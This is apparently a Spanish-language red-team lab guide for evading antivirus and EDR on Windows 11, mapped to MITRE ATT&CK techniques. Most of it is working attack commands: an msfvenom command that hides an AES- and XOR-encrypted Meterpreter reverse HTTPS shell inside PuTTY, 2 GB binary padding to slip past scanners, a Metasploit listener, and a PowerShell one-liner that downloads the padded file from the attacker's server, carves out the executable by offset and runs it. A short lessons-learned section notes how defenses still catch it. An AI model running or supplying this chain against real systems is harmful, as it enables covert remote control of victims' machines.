✅ Guía de Laboratorio: Evasión Avanzada de Defensas (Red Team)

Este laboratorio demuestra cómo combinar técnicas de Binary Padding, Backdooring, Ofuscación y Ejecución Living-off-the-Land (LotL) para evadir sistemas de seguridad modernos como Antivirus y EDR (Endpoint Detection and Response).

🛡️ Mapeo de Tácticas y Técnicas (MITRE ATT&CK)

A continuación se detallan las técnicas adversariales que se implementarán en este ejercicio:

Táctica Técnica Código MITRE
Ejecución Command and Scripting Interpreter: PowerShell T1059.001
Evasión de Defensas Obfuscated Files or Information: Binary Padding T1027.001
Evasión de Defensas Masquerading (Uso de Metadatos Legítimos) T1036
Evasión de Defensas Deobfuscate/Decode Files or Information T1140
Evasión de Defensas Obfuscated Files or Information (Cifrado AES/XOR) T1027

🏗️ Escenario y Arquitectura de Red

Para que el laboratorio sea exitoso, es fundamental configurar el entorno virtual de la siguiente manera:

  • Segmento de Red: Ambas máquinas (Atacante y Víctima) deben estar conectadas al switch virtual VMnet1 (Host-only).
  • Subred: El laboratorio está diseñado para operar como ejemplo en el rango 192.168.80.0/24
  • Servicio DHCP: En la aplicación Virtual Network Editor de tu máquina física, asegurate de tener marcada la opción "Use local DHCP service to distribute IP address to VMs".
  • Verificación:
    • En Kali, usá ifconfig para verificar tu IP.
    • En Windows, usá ipconfig en el CMD.

💀 FASE 1: Preparación en Kali Linux (Atacante)

1. Creación del archivo de inflado (Binary Padding)

dd if=/dev/zero of=fat_file bs=1M count=2048
  • Explicación: Crea un archivo de 2 GB lleno de ceros.
  • Objetivo técnico: Evadir escaneos de AV y Sandboxes que omiten archivos pesados para no degradar el rendimiento del sistema (MITRE T1027.001).

2. Creación de la cabecera (Offset)

python3 -c "print('A'*736, end='')" > head_file.txt
  • Explicación: Crea un archivo de texto de exactamente 736 bytes.
  • Objetivo técnico: Sirve como "colchón" inicial para desplazar los bytes mágicos del ejecutable, engañando al análisis estático inicial.

3. Generación del Malware (Backdooring e Inyección)

⚠️ Requisito previo obligatorio: Para que este paso funcione, necesitás el archivo de plantilla PuTTY original.

1. Descargá el archivo desde aquí: 📥 Descargar putty-68-64.exe
2. Ubicación: Copiá el archivo descargado y pegalo dentro de la misma carpeta donde tenés abierta la terminal de Kali (ej: ~/Lab05).

Una vez que el archivo "putty-68-64.exe" esté en tu carpeta, edita del siguiente comando la parte "LHOST=192.168.44.130" que tiene que ser la IP del atacante (Kali) y luego ejecutá el siguiente comando:

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.44.130 LPORT=8443 EXITFUNC=thread -f exe -a x64 --platform windows -x putty-68-64.exe -i 10 --encoder x64/xor_dynamic --encrypt aes256 --encrypt-key S3C4135huhbksdA -o mi_m4lw4r3.exe
  • -x putty-68-64.exe: Indica a msfvenom que use este programa como "mula" para inyectar el código y heredar sus metadatos (**Masquerading**).
  • -i 10: Aplica el codificador XOR 10 veces para intentar evadir firmas estáticas simples.
  • --encrypt aes256: Aplica una capa de cifrado adicional al payload para ocultar las funciones maliciosas.

4. Ensamblaje Final (Concatenación)

cat head_file.txt mi_m4lw4r3.exe fat_file > archivo_inocente.txt
  • Esto crea un nuevo archivo con la siguiente estructura: [Texto Inútil (736b)] + [Malware Cifrado] + [2GB de Ceros]

5. Entrega y Recepción (C2 Setup)

Terminal 1 (Servidor Web):

Levantar un servidor web donde se encuentra los archivos

python3 -m http.server 8000

Terminal 2 (Listener Metasploit):

Edita del siguiente comando la parte "LHOST=192.168.44.130" que tiene que ser la IP del atacante (Kali)

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.44.130; set LPORT 8443; exploit"

🎯 FASE 2: Ejecución en Windows 11 (Víctima)

6. El Stager de PowerShell (One-Liner)

Editar el "http://192.168.44.130:8000/archivo_inocente.txt" y coloca la IP del atacante (Kali)

Ejecutar en una terminal de PowerShell:

Set-Variable ProgressPreference SilentlyContinue; iwr http://192.168.44.130:8000/archivo_inocente.txt -o "$PWD\archivo_inocente.txt"; $i="$PWD\archivo_inocente.txt"; $o=Join-Path $PWD ([IO.Path]::GetRandomFileName().Replace('.','')+'.exe'); $a=[IO.File]::OpenRead($i); $b=[IO.File]::Create($o); $a.Seek(736,'Begin')>$null; $a.CopyTo($b); $a.Close(); $b.Close(); saps $o

Análisis del comando:

  1. iwr: Descarga el contenedor de 2GB.
  2. GetRandomFileName(): Genera un nombre aleatorio (ej: m3dppziodbe.exe) para evadir firmas de nombre.
  3. $a.Seek(736,'Begin'): Salta el texto inicial e identifica el inicio del malware oculto.
  4. $a.CopyTo($b): Extrae el malware real al disco.
  5. saps: Ejecuta el proceso inyectado.

📊 Resumen de Técnicas MITRE ATT&CK

  • T1027.001 - Binary Padding: Inflado de archivo a 2GB.
  • T1036 - Masquerading: Uso de metadatos de PuTTY.
  • T1059.001 - PowerShell: Ejecución mediante Living-off-the-Land (LotL).
  • T1140 - Deobfuscate/Decode Files: Extracción manual mediante offsets.
  • T1027 - Obfuscated Files: Cifrado AES y XOR dinámico.

💡 Lecciones Aprendidas

  • Evasión por Tamaño: El inflado de archivos (2GB) es efectivo contra escaneos estáticos automáticos, pero no contra el análisis de comportamiento.
  • Detección Heurística: Windows Defender puede detectar un "ShellcodeRunner" mediante AMSI incluso si el archivo está cifrado, al analizar la actividad en la memoria RAM.
  • Firma Digital: El Masquerading engaña al ojo humano, pero el sistema detecta la falta de una firma digital válida en el archivo modificado.
  • Poder de PowerShell: La capacidad de manipular archivos mediante clases de .NET permite realizar extracciones complejas sin herramientas externas.
